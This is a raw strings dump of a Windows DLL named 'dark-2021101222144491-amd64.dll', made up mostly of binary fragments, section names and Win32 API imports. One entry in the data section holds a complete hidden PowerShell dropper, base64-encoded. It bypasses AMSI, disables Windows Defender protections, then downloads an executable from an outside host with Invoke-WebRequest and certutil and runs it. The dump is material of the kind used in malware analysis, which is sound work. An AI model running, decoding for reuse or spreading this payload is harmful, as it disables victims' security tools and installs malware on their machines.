Metadata Signature: 0x153d8 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: a0
Stream name: #~ 4
DirectoryAddress: 10c Size: 6c
Stream name: #Strings 12
DirectoryAddress: 178 Size: 8
Stream name: #US 4
DirectoryAddress: 180 Size: 10
Stream name: #GUID 8
DirectoryAddress: 190 Size: 10
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr       len  size section type    string
1522 0x000145dd 0x1800159dd 4    5    .rdata  ascii   S9>H
1523 0x0001460c 0x180015a0c 4    5    .rdata  ascii   .\f0>
1524 0x00014624 0x180015a24 4    5    .rdata  ascii   x.&>
1525 0x00014632 0x180015a32 7    8    .rdata  ascii   K~Je#>!
1526 0x00014644 0x180015a44 5    6    .rdata  ascii   -/!>\f
1527 0x00014656 0x180015a56 4    5    .rdata  ascii   (>aI
1528 0x0001465f 0x180015a5f 4    5    .rdata  ascii   =cQ6
1529 0x0001466b 0x180015a6b 5    6    .rdata  ascii   +M<7>
1530 0x0001467c 0x180015a7c 5    7    .rdata  utf8    ư*>f[ blocks=Latin Extended-B,Basic Latin
1531 0x0001468c 0x180015a8c 4    5    .rdata  ascii   o ->
1532 0x000146ac 0x180015aac 4    5    .rdata  ascii   l(>>
1533 0x000146b1 0x180015ab1 9    10   .rdata  ascii   \n"I\vc(>\,
1534 0x000146c4 0x180015ac4 4    5    .rdata  ascii   ET5>
1535 0x000146ce 0x180015ace 4    5    .rdata  ascii   ;>9l
1536 0x000146e4 0x180015ae4 4    5    .rdata  ascii   mG4>
1537 0x0001470b 0x180015b0b 9    11   .rdata  utf8    bp(=>?gҀ8 blocks=Basic Latin,Cyrillic
1538 0x0001471c 0x180015b1c 4    5    .rdata  ascii   36,>
1539 0x0001472e 0x180015b2e 5    7    .rdata  utf8    ;>PӽD blocks=Basic Latin,Cyrillic
1540 0x0001476d 0x180015b6d 4    5    .rdata  ascii   37>k
1541 0x00014791 0x180015b91 4    5    .rdata  ascii   \bm"e
1542 0x0001479c 0x180015b9c 4    5    .rdata  ascii   ~X3>
1543 0x000147ae 0x180015bae 5    6    .rdata  ascii   6>J`\b
1544 0x000147b5 0x180015bb5 5    6    .rdata  ascii   \a?>!T
1545 0x000147bd 0x180015bbd 6    7    .rdata  ascii   4<>\v0A
1546 0x000147c6 0x180015bc6 17   19   .rdata  utf8    8>c\eքBC?>6t9^\tc:> blocks=Basic Latin,Armenian
1547 0x000147ed 0x180015bed 4    5    .rdata  ascii   8'>0
1548 0x00014811 0x180015c11 4    5    .rdata  ascii   '._M
1549 0x0001481f 0x180015c1f 4    5    .rdata  ascii   =4<,
1550 0x00014825 0x180015c25 5    6    .rdata  ascii   BF>^G
1551 0x00014835 0x180015c35 6    7    .rdata  ascii   K&>.yC
1552 0x0001483c 0x180015c3c 4    5    .rdata  ascii   B\r)>
1553 0x00014843 0x180015c43 6    7    .rdata  ascii   \b 'L>[
1554 0x0001484c 0x180015c4c 6    7    .rdata  ascii   .xJ>Hf
1555 0x00014853 0x180015c53 6    7    .rdata  ascii   y\PD>!
1556 0x00014862 0x180015c62 6    7    .rdata  ascii   |b=})>
1557 0x00014873 0x180015c73 7    8    .rdata  ascii   c [1>H'
1558 0x00014884 0x180015c84 4    5    .rdata  ascii   dL?>
1559 0x000148b2 0x180015cb2 6    7    .rdata  ascii   uzKs@>
1560 0x000148ce 0x180015cce 6    7    .rdata  ascii   3>N;kU
1561 0x000148ed 0x180015ced 4    5    .rdata  ascii   \eK>V
1562 0x000148fc 0x180015cfc 7    8    .rdata  ascii   \tkE>fvw
1563 0x00014915 0x180015d15 4    5    .rdata  ascii   eF>t
1564 0x00014926 0x180015d26 4    5    .rdata  ascii   L>ev
1565 0x0001493e 0x180015d3e 5    6    .rdata  ascii   A>pP&
1566 0x00014944 0x180015d44 8    9    .rdata  ascii   V6E>`"(5
1567 0x0001494d 0x180015d4d 6    8    .rdata  utf8    ~7>ҹ@0 blocks=Basic Latin,Cyrillic
1568 0x0001498d 0x180015d8d 4    5    .rdata  ascii   ,=>B
1569 0x00014996 0x180015d96 4    5    .rdata  ascii   ">}t
1570 0x000149bc 0x180015dbc 5    6    .rdata  ascii   0iN>/
1571 0x000149cc 0x180015dcc 5    6    .rdata  ascii   +h->|
1572 0x000149de 0x180015dde 5    6    .rdata  ascii   @>%>b
1573 0x00014a1f 0x180015e1f 4    5    .rdata  ascii   ?qBJ
1574 0x00014ac7 0x180015ec7 5    7    .rdata  utf8    ?ƿD\n blocks=Basic Latin,Latin Extended-B
1575 0x00014af9 0x180015ef9 4    6    .rdata  utf8    I\rєX blocks=Basic Latin,Cyrillic
1576 0x00014b4f 0x180015f4f 5    8    .rdata  utf8    ?O\e贁N blocks=Basic Latin,CJK Unified Ideographs
1577 0x00014b5f 0x180015f5f 6    8    .rdata  utf8    ?ـl@6  blocks=Basic Latin,Arabic
1578 0x00014baa 0x180015faa 4    5    .rdata  ascii   h\aAW
1579 0x00014bd7 0x180015fd7 4    5    .rdata  ascii   ?-hk
1580 0x00014ca9 0x1800160a9 4    5    .rdata  ascii   OZQ%
1581 0x00014d27 0x180016127 4    6    .rdata  utf8    ?aȁ& blocks=Basic Latin,Latin Extended-B
1582 0x00014d6f 0x18001616f 5    6    .rdata  ascii   ?d!\vY
1583 0x00014d99 0x180016199 4    5    .rdata  ascii   -)4d
1584 0x00014ddf 0x1800161df 5    6    .rdata  ascii   ?:kP<
1585 0x00014def 0x1800161ef 7    8    .rdata  ascii   ?UUUUUU
1586 0x00014e37 0x180016237 5    7    .rdata  utf8    ?L,ܾC blocks=Basic Latin,Syriac
1587 0x00014e77 0x180016277 5    6    .rdata  ascii   ?f`Y4
1588 0x00014ea7 0x1800162a7 5    6    .rdata  ascii   ?QY^&
1589 0x00014ee7 0x1800162e7 4    5    .rdata  ascii   ?U)#
1590 0x00014fc7 0x1800163c7 4    6    .rdata  utf8    ?MΡ8 blocks=Basic Latin,Greek and Coptic
1591 0x00015022 0x180016422 4    5    .rdata  ascii   g\fG\v
1592 0x0001509f 0x18001649f 4    5    .rdata  ascii   ?ysB
1593 0x000150af 0x1800164af 5    6    .rdata  ascii   ?\r'u_
1594 0x000150c7 0x1800164c7 4    5    .rdata  ascii   ?$G4
1595 0x000150df 0x1800164df 4    5    .rdata  ascii   ?30]
1596 0x0001512f 0x18001652f 5    7    .rdata  utf8    ?;ڼOq blocks=Basic Latin,Arabic
1597 0x00015182 0x180016582 4    5    .rdata  ascii   G\n&s
1598 0x000151d7 0x1800165d7 6    7    .rdata  ascii   ?7zQ6$
1599 0x00015200 0x180016600 5    6    .rdata  ascii   log10
1600 0x000153d8 0x1800167d8 4    5    .rdata  ascii   BSJB
1601 0x000153e8 0x1800167e8 10   11   .rdata  ascii   v4.0.30319
1602 0x0001540c 0x18001680c 8    9    .rdata  ascii   #Strings
1603 0x0001542c 0x18001682c 5    6    .rdata  ascii   #GUID
1604 0x0001543c 0x18001683c 5    6    .rdata  ascii   #Blob
1605 0x000154e5 0x1800168e5 8    9    .rdata  ascii   <Module>
1606 0x000154ee 0x1800168ee 5    6    .rdata  ascii   Empty
1607 0x000154f4 0x1800168f4 8    9    .rdata  ascii   mscorlib
1608 0x000154fd 0x1800168fd 6    7    .rdata  ascii   Object
1609 0x00015504 0x180016904 6    7    .rdata  ascii   System
1610 0x0001550b 0x18001690b 5    6    .rdata  ascii   .ctor
1611 0x00015511 0x180016911 27   28   .rdata  ascii   dark-2021101222144491-amd64
1612 0x0001552d 0x18001692d 31   32   .rdata  ascii   dark-2021101222144491-amd64.dll
1613 0x00015660 0x180016a60 4    5    .rdata  ascii   GCTL
1614 0x0001566c 0x180016a6c 8    9    .rdata  ascii   .text$mn
1615 0x00015680 0x180016a80 11   12   .rdata  ascii   .text$mn$00
1616 0x00015694 0x180016a94 7    8    .rdata  ascii   .text$x
1617 0x000156a4 0x180016aa4 8    9    .rdata  ascii   .idata$5
1618 0x000156b8 0x180016ab8 6    7    .rdata  ascii   .00cfg
1619 0x000156c8 0x180016ac8 8    9    .rdata  ascii   .CRT$XCA
1620 0x000156dc 0x180016adc 8    9    .rdata  ascii   .CRT$XCZ
1621 0x000156f0 0x180016af0 8    9    .rdata  ascii   .CRT$XIA
1622 0x00015704 0x180016b04 8    9    .rdata  ascii   .CRT$XIC
1623 0x00015718 0x180016b18 8    9    .rdata  ascii   .CRT$XIZ
1624 0x0001572c 0x180016b2c 8    9    .rdata  ascii   .CRT$XPA
1625 0x00015740 0x180016b40 8    9    .rdata  ascii   .CRT$XPX
1626 0x00015754 0x180016b54 9    10   .rdata  ascii   .CRT$XPXA
1627 0x00015768 0x180016b68 8    9    .rdata  ascii   .CRT$XPZ
1628 0x0001577c 0x180016b7c 8    9    .rdata  ascii   .CRT$XTA
1629 0x00015790 0x180016b90 8    9    .rdata  ascii   .CRT$XTZ
1630 0x000157a4 0x180016ba4 6    7    .rdata  ascii   .rdata
1631 0x000157b4 0x180016bb4 13   14   .rdata  ascii   .rdata$voltmd
1632 0x000157cc 0x180016bcc 13   14   .rdata  ascii   .rdata$zzzdbg
1633 0x000157e4 0x180016be4 8    9    .rdata  ascii   .rtc$IAA
1634 0x000157f8 0x180016bf8 8    9    .rdata  ascii   .rtc$IZZ
1635 0x0001580c 0x180016c0c 8    9    .rdata  ascii   .rtc$TAA
1636 0x00015820 0x180016c20 8    9    .rdata  ascii   .rtc$TZZ
1637 0x00015834 0x180016c34 6    7    .rdata  ascii   .xdata
1638 0x00015844 0x180016c44 8    9    .rdata  ascii   .idata$2
1639 0x00015858 0x180016c58 8    9    .rdata  ascii   .idata$3
1640 0x0001586c 0x180016c6c 8    9    .rdata  ascii   .idata$4
1641 0x00015880 0x180016c80 8    9    .rdata  ascii   .idata$6
1642 0x00015894 0x180016c94 5    6    .rdata  ascii   .data
1643 0x000158a4 0x180016ca4 4    5    .rdata  ascii   .bss
1644 0x000158b4 0x180016cb4 6    7    .rdata  ascii   .pdata
1645 0x000158c4 0x180016cc4 6    7    .rdata  ascii   _RDATA
1646 0x00015b6d 0x180016f6d 5    6    .rdata  ascii   2\vp@\e
1647 0x00015b96 0x180016f96 4    5    .rdata  ascii   \bp\a`
1648 0x00015c15 0x180017015 5    6    .rdata  ascii   2\vp@\e
1649 0x00015c6e 0x18001706e 4    5    .rdata  ascii   \fp\vP
1650 0x00015d21 0x180017121 5    6    .rdata  ascii   2\vp@\e
1651 0x00015dc9 0x1800171c9 5    6    .rdata  ascii   2\vp@\e
1652 0x00015ded 0x1800171ed 5    6    .rdata  ascii   2\vp@\e
1653 0x00015e11 0x180017211 5    6    .rdata  ascii   2\vp@\e
1654 0x00015e35 0x180017235 5    6    .rdata  ascii   2\vp@\e
1655 0x00015e7a 0x18001727a 6    7    .rdata  ascii   \rp\f`\vP
1656 0x00015eb0 0x1800172b0 4    5    .rdata  ascii   \bp\a`
1657 0x00015f02 0x180017302 4    5    .rdata  ascii   \bp\a`
1658 0x00015f25 0x180017325 5    6    .rdata  ascii   2\vp@\e
1659 0x00015f75 0x180017375 5    6    .rdata  ascii   2\vp@\e
1660 0x00015fae 0x1800173ae 6    7    .rdata  ascii   \fp\v`\nP
1661 0x000160a5 0x1800174a5 5    6    .rdata  ascii   2\vp@\e
1662 0x000160d1 0x1800174d1 5    6    .rdata  ascii   2\vp@\e
1663 0x000160f8 0x1800174f8 6    7    .rdata  ascii   \fp\v`@\e
1664 0x0001617e 0x18001757e 4    5    .rdata  ascii   \bp\a`
1665 0x00016325 0x180017725 5    6    .rdata  ascii   2\vp@\e
1666 0x00016382 0x180017782 4    5    .rdata  ascii   \bp\a`
1667 0x0001639c 0x18001779c 4    5    .rdata  ascii   \bp\a`
1668 0x000163be 0x1800177be 4    5    .rdata  ascii   \fp\v`
1669 0x000163e2 0x1800177e2 4    5    .rdata  ascii   \fp\v`
1670 0x00016491 0x180017891 5    6    .rdata  ascii   2\vp@\e
1671 0x000164ba 0x1800178ba 4    5    .rdata  ascii   \bp\a`
1672 0x000164dd 0x1800178dd 5    6    .rdata  ascii   2\vp@\e
1673 0x00016569 0x180017969 5    6    .rdata  ascii   2\vp@\e
1674 0x0001688a 0x180017c8a 23   24   .rdata  ascii   QueryPerformanceCounter
1675 0x000168a4 0x180017ca4 19   20   .rdata  ascii   GetCurrentProcessId
1676 0x000168ba 0x180017cba 18   19   .rdata  ascii   GetCurrentThreadId
1677 0x000168d0 0x180017cd0 23   24   .rdata  ascii   GetSystemTimeAsFileTime
1678 0x000168ea 0x180017cea 19   20   .rdata  ascii   InitializeSListHead
1679 0x00016900 0x180017d00 17   18   .rdata  ascii   RtlCaptureContext
1680 0x00016914 0x180017d14 22   23   .rdata  ascii   RtlLookupFunctionEntry
1681 0x0001692e 0x180017d2e 16   17   .rdata  ascii   RtlVirtualUnwind
1682 0x00016942 0x180017d42 17   18   .rdata  ascii   IsDebuggerPresent
1683 0x00016956 0x180017d56 24   25   .rdata  ascii   UnhandledExceptionFilter
1684 0x00016972 0x180017d72 27   28   .rdata  ascii   SetUnhandledExceptionFilter
1685 0x00016990 0x180017d90 15   16   .rdata  ascii   GetStartupInfoW
1686 0x000169a2 0x180017da2 25   26   .rdata  ascii   IsProcessorFeaturePresent
1687 0x000169be 0x180017dbe 16   17   .rdata  ascii   GetModuleHandleW
1688 0x000169d0 0x180017dd0 12   13   .rdata  ascii   KERNEL32.dll
1689 0x000169e0 0x180017de0 11   12   .rdata  ascii   RtlUnwindEx
1690 0x000169ee 0x180017dee 21   22   .rdata  ascii   InterlockedFlushSList
1691 0x00016a06 0x180017e06 12   13   .rdata  ascii   GetLastError
1692 0x00016a16 0x180017e16 12   13   .rdata  ascii   SetLastError
1693 0x00016a26 0x180017e26 20   21   .rdata  ascii   EnterCriticalSection
1694 0x00016a3e 0x180017e3e 20   21   .rdata  ascii   LeaveCriticalSection
1695 0x00016a56 0x180017e56 21   22   .rdata  ascii   DeleteCriticalSection
1696 0x00016a6e 0x180017e6e 37   38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
1697 0x00016a96 0x180017e96 8    9    .rdata  ascii   TlsAlloc
1698 0x00016aa2 0x180017ea2 11   12   .rdata  ascii   TlsGetValue
1699 0x00016ab0 0x180017eb0 11   12   .rdata  ascii   TlsSetValue
1700 0x00016abe 0x180017ebe 7    8    .rdata  ascii   TlsFree
1701 0x00016ac8 0x180017ec8 11   12   .rdata  ascii   FreeLibrary
1702 0x00016ad6 0x180017ed6 14   15   .rdata  ascii   GetProcAddress
1703 0x00016ae8 0x180017ee8 14   15   .rdata  ascii   LoadLibraryExW
1704 0x00016afa 0x180017efa 14   15   .rdata  ascii   RaiseException
1705 0x00016b0c 0x180017f0c 17   18   .rdata  ascii   GetCurrentProcess
1706 0x00016b20 0x180017f20 11   12   .rdata  ascii   ExitProcess
1707 0x00016b2e 0x180017f2e 16   17   .rdata  ascii   TerminateProcess
1708 0x00016b42 0x180017f42 18   19   .rdata  ascii   GetModuleHandleExW
1709 0x00016b58 0x180017f58 18   19   .rdata  ascii   GetModuleFileNameW
1710 0x00016b6e 0x180017f6e 8    9    .rdata  ascii   HeapFree
1711 0x00016b7a 0x180017f7a 11   12   .rdata  ascii   CloseHandle
1712 0x00016b88 0x180017f88 19   20   .rdata  ascii   WaitForSingleObject
1713 0x00016b9e 0x180017f9e 18   19   .rdata  ascii   GetExitCodeProcess
1714 0x00016bb4 0x180017fb4 14   15   .rdata  ascii   CreateProcessW
1715 0x00016bc6 0x180017fc6 20   21   .rdata  ascii   GetFileAttributesExW
1716 0x00016bde 0x180017fde 9    10   .rdata  ascii   HeapAlloc
1717 0x00016bea 0x180017fea 9    10   .rdata  ascii   FindClose
1718 0x00016bf6 0x180017ff6 16   17   .rdata  ascii   FindFirstFileExW
1719 0x00016c0a 0x18001800a 13   14   .rdata  ascii   FindNextFileW
1720 0x00016c1a 0x18001801a 15   16   .rdata  ascii   IsValidCodePage
1721 0x00016c2c 0x18001802c 6    7    .rdata  ascii   GetACP
1722 0x00016c36 0x180018036 8    9    .rdata  ascii   GetOEMCP
1723 0x00016c42 0x180018042 9    10   .rdata  ascii   GetCPInfo
1724 0x00016c4e 0x18001804e 15   16   .rdata  ascii   GetCommandLineA
1725 0x00016c60 0x180018060 15   16   .rdata  ascii   GetCommandLineW
1726 0x00016c72 0x180018072 19   20   .rdata  ascii   MultiByteToWideChar
1727 0x00016c88 0x180018088 19   20   .rdata  ascii   WideCharToMultiByte
1728 0x00016c9e 0x18001809e 22   23   .rdata  ascii   GetEnvironmentStringsW
1729 0x00016cb8 0x1800180b8 23   24   .rdata  ascii   FreeEnvironmentStringsW
1730 0x00016cd2 0x1800180d2 23   24   .rdata  ascii   SetEnvironmentVariableW
1731 0x00016cec 0x1800180ec 14   15   .rdata  ascii   CompareStringW
1732 0x00016cfe 0x1800180fe 12   13   .rdata  ascii   LCMapStringW
1733 0x00016d0e 0x18001810e 14   15   .rdata  ascii   GetProcessHeap
1734 0x00016d20 0x180018120 12   13   .rdata  ascii   GetStdHandle
1735 0x00016d30 0x180018130 11   12   .rdata  ascii   GetFileType
1736 0x00016d3e 0x18001813e 14   15   .rdata  ascii   GetStringTypeW
1737 0x00016d50 0x180018150 8    9    .rdata  ascii   HeapSize
1738 0x00016d5c 0x18001815c 11   12   .rdata  ascii   HeapReAlloc
1739 0x00016d6a 0x18001816a 12   13   .rdata  ascii   SetStdHandle
1740 0x00016d7a 0x18001817a 16   17   .rdata  ascii   FlushFileBuffers
1741 0x00016d8e 0x18001818e 9    10   .rdata  ascii   WriteFile
1742 0x00016d9a 0x18001819a 18   19   .rdata  ascii   GetConsoleOutputCP
1743 0x00016db0 0x1800181b0 14   15   .rdata  ascii   GetConsoleMode
1744 0x00016dc2 0x1800181c2 16   17   .rdata  ascii   SetFilePointerEx
1745 0x00016dd6 0x1800181d6 11   12   .rdata  ascii   CreateFileW
1746 0x00016de4 0x1800181e4 13   14   .rdata  ascii   WriteConsoleW
1747 0x00016df4 0x1800181f4 11   12   .rdata  ascii   _CorDllMain
1748 0x00016e00 0x180018200 11   12   .rdata  ascii   mscoree.dll
1749 0x00017000 0x180019000 1849 1850 .data   ascii   powershell.exe -nop -w hidden -e JAB3ACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYwAgAD0AIAAnAHMAaQAnADsAJABtACAAPQAgACcAVQB0AGkAbABzACcAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AG0AewAxAH0AewAyAH0AJwAgAC0AZgAgACQAdwAsACQAYwAsACQAbQApACkAIAA7ACAAJABmAGkAZQBsAGQAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQBtAHsAMAB9AEkAbgBpAHQARgBhAGkAbABlAGQAJwAgAC0AZgAgACQAYwApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlACAALQBEAGkAcwBhAGIAbABlAFMAYwByAGkAcAB0AFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIABoAHQAdABwADoALwAvAGYAYgBpAC4AZgB1AG4AZAAvAGQAYQByAGsALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAGQAYQByAGsALgBlAHgAZQA7AGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AZgBiAGkALgBmAHUAbgBkAC8AZABhAHIAawAuAGUAeABlACAAOwAgAC4AXABkAGEAcgBrAC4AZQB4AGUA
1750 0x0001781a 0x18001981a 26   27   .data   ascii                             
1751 0x000178fa 0x1800198fa 26   27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1752 0x0001791a 0x18001991a 26   27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1753 0x00017a32 0x180019a32 26   27   .data   ascii                             
1754 0x00017b21 0x180019b21 26   27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1755 0x00017b41 0x180019b41 26   27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1756 0x00019542 0x18001e142 4    8    .reloc  utf8    %ȥХ  blocks=Basic Latin,Latin Extended-B,Cyrillic
1757 0x000195a8 0x18001e1a8 4    9    .reloc  utf8    ,ȬЬج blocks=Basic Latin,Latin Extended-B,Cyrillic,Arabic
1758 0x000195e6 0x18001e1e6 4    9    .reloc  utf8    -ȭЭح blocks=Basic Latin,Latin Extended-B,Cyrillic,Arabic
1759 0x00019a2a 0x18001e62a 4    9    .reloc  utf8    /ȯЯد blocks=Basic Latin,Latin Extended-B,Cyrillic,Arabic

